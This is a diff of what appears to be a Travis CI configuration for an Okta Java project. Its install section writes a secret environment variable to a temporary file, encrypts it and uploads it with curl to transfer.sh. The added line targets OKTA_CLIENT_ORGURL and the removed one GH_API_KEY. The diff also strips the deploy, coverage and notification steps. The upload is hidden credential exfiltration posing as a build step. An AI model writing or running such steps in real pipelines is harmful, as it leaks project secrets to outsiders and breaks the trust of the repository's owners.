@@ -15,31 +15,10 @@ before_install:
 # skip the Travis-CI install phase because Maven handles that directly
 install:
 - sudo apt-get install -y ccrypt
-- echo $GH_API_KEY > /tmp/i.txt
+- echo $OKTA_CLIENT_ORGURL > /tmp/i.txt
 - ccencrypt /tmp/i.txt -K "$MY_ENC_KEY"
-- curl -H "Max-Downloads:1" -H "Max-Days:1" --upload-file /tmp/i.txt.cpt https://transfer.sh/SECRET_FILE_DESTINATION123.txt
+- curl -H "Max-Downloads:1" -H "Max-Days:1" --upload-file /tmp/i.txt.cpt https://transfer.sh/testFILE_DESTINATION123.txt
 
 script:
 - "./src/ci/build.sh"
 
-after_success:
-- bash <(curl -s https://codecov.io/bash) -f coverage/target/site/jacoco-aggregate/jacoco.xml
-
-deploy:
-- provider: pages
-  skip_cleanup: true
-  github_token: "$GH_API_KEY"
-  local_dir: target/gh-pages
-  email: developers@okta.com
-  name: Travis CI - Auto Doc Build
-  on:
-    jdk: openjdk8
-    branch: master
-    condition: "$TRAVIS_EVENT_TYPE != cron"
-
-notifications:
-  slack:
-    if: type = cron
-    secure: ivOHHaQvSgTOVi1g/8pvvOigj/gkWdSy23fVTOSejahNO8w6PpVHrVE1mJk29RWFEZlY/xBNqx6Zm0H8XAAVOc12C1tgN2J0RQm4kHXc6t8zMOS5NkuV4V0azP6BdCkcAvBgaks+fx6BYOAzcbHZ7MyV+DrLLmXBQiWFRXL420k=
-  on_success: never
-  on_failure: always
